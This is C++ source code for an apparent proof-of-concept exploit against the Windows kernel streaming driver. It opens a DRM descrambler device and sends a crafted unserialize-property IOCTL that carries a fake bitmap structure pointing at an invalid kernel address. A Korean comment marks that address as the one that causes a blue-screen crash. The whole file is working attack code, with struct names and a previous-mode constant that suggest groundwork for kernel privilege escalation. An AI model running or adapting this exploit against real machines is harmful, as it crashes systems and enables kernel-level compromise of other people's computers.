#define UNICODE 1
#define _UNICODE 1
#define _PREVIOUS_MODE 0xbaba

#include <windows.h>
#include <winioctl.h>
#include <initguid.h>
#include <ks.h>
#include <ksmedia.h>
#include <ksproxy.h>
#include <setupapi.h>
#include <stdio.h>
#include <stdint.h>

#pragma comment(lib, "ksproxy.lib")
#pragma comment(lib, "setupapi.lib")
#pragma comment(lib, "ksuser.lib")

typedef struct _RTL_BITMAP {
    DWORD SizeOfBitMap;
    PVOID Buffer;
} RTL_BITMAP, *PRTL_BITMAP;

#pragma pack(1)
typedef struct _EXPLOIT_DATA1 {
    PRTL_BITMAP FakeBitmap;
    ULONGLONG FunctionPtr;
} EXPLOIT_DATA1;

UCHAR InBuffer[sizeof(KSPROPERTY)] = { 0 };
KSPROPERTY* pInBufProperty = (KSPROPERTY*)InBuffer;

UCHAR UnserializePropertySetRequest[sizeof(KSPROPERTY_SERIALHDR) + sizeof(KSPROPERTY_SERIAL) + sizeof(EXPLOIT_DATA1)] = { 0 };
KSPROPERTY_SERIALHDR* pSerialHdr = (KSPROPERTY_SERIALHDR*)UnserializePropertySetRequest;
KSPROPERTY_SERIAL* pSerial = (KSPROPERTY_SERIAL*)(pSerialHdr + 1);
EXPLOIT_DATA1* pOutBufPropertyData = (EXPLOIT_DATA1*)(pSerial + 1);

extern "C" {
    __declspec(dllimport)
        HRESULT WINAPI KsOpenDefaultDevice(
            REFGUID Category,
            ACCESS_MASK Access,
            PHANDLE Handle
        );
}

HANDLE GetKsDevice(const GUID categories) {
    HANDLE hDevice = 0;
    HRESULT hr = KsOpenDefaultDevice(categories, GENERIC_READ | GENERIC_WRITE, &hDevice);
    if (hr != NOERROR) {
        printf("[-] KsOpenDefaultDevice failed with error = %x\n", hr);
        return NULL;
    }
    return hDevice;
}

BOOL SendIoctlReq(HANDLE hDevice) {
    return DeviceIoControl(hDevice, IOCTL_KS_PROPERTY,
                         pInBufProperty, sizeof(InBuffer),
                         pSerialHdr, sizeof(UnserializePropertySetRequest),
                         NULL, NULL);
}

void* AllocateBitmap(SIZE_T size, LPVOID baseAddress) {
    return VirtualAlloc(baseAddress, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
}

__inline void* Ptr64(const unsigned long long ull) {
    return((void*)(ULONG_PTR)ull);
}

int wmain() {
    HANDLE hDevice = GetKsDevice(KSCATEGORY_DRM_DESCRAMBLE);
    if (!hDevice || hDevice == INVALID_HANDLE_VALUE) {
        printf("[-] GetKsDevice failed\n");
        return 1;
    }
    printf("[+] DRM device opened successfully!\n");

    pInBufProperty->Set = KSPROPSETID_DrmAudioStream;
    pInBufProperty->Flags = KSPROPERTY_TYPE_UNSERIALIZESET;
    pInBufProperty->Id = 0x0;

    pSerialHdr->PropertySet = KSPROPSETID_DrmAudioStream;
    pSerialHdr->Count = 0x1;

    pSerial->PropertyLength = sizeof(EXPLOIT_DATA1);
    pSerial->Id = 0x0;
    pSerial->PropTypeSet.Set = KSPROPSETID_DrmAudioStream;
    pSerial->PropTypeSet.Flags = 0x0;
    pSerial->PropTypeSet.Id = 0x45;

    pOutBufPropertyData->FakeBitmap = (PRTL_BITMAP)AllocateBitmap(sizeof(RTL_BITMAP), NULL);
    if (!pOutBufPropertyData->FakeBitmap) {
        printf("[-] Failed to allocate FakeBitmap\n");
        CloseHandle(hDevice);
        return 1;
    }

    pOutBufPropertyData->FakeBitmap->SizeOfBitMap = 0x80;
    pOutBufPropertyData->FakeBitmap->Buffer = Ptr64(0xDEADBEEFDEADBEEF); // BSOD 유발 주소

    printf("[*] Sending IOCTL request...\n");
    BOOL res = SendIoctlReq(hDevice);

    if (res) {
        printf("[+] SendIoctlReq succeeded!\n");
    } else {
        DWORD err = GetLastError();
        printf("[-] SendIoctlReq failed. Error = %lu\n", err);
        if (err == 87) printf("[!] ERROR_INVALID_PARAMETER\n");
        else if (err == 1784) printf("[!] ERROR_INVALID_USER_BUFFER\n");
    }

    if (pOutBufPropertyData->FakeBitmap) {
        VirtualFree(pOutBufPropertyData->FakeBitmap, 0, MEM_RELEASE);
    }
    if (hDevice != INVALID_HANDLE_VALUE) {
        CloseHandle(hDevice);
    }

    return 0;
}

